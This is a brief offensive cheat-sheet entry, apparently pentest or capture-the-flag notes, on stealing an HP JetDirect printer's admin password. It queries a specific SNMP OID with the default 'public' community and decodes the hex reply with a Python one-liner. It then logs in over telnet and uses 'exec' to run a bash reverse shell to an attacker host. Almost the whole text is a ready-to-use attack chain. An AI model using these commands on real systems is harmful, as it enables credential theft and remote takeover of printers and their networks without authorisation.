# HP JetDirect SNMP Password Leak

HP JetDirect printers expose the admin password via a specific SNMP OID. The response is hex-encoded bytes; first 16+ printable hex values decode to the password.

```bash
snmpwalk -v 2c -c public <TARGET> .1.3.6.1.4.1.11.2.3.9.1.1.13.0
# Output: BITS: 50 40 73 73 77 30 72 64 ...
# Decode printable bytes (0x20–0x7e):
python3 -c "data='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33'; print(bytes.fromhex(data.replace(' ','')))"
```

After recovering password, authenticate via telnet and use the `exec` command:
```
telnet <TARGET>
Password: <RECOVERED>
> exec id
> exec bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```
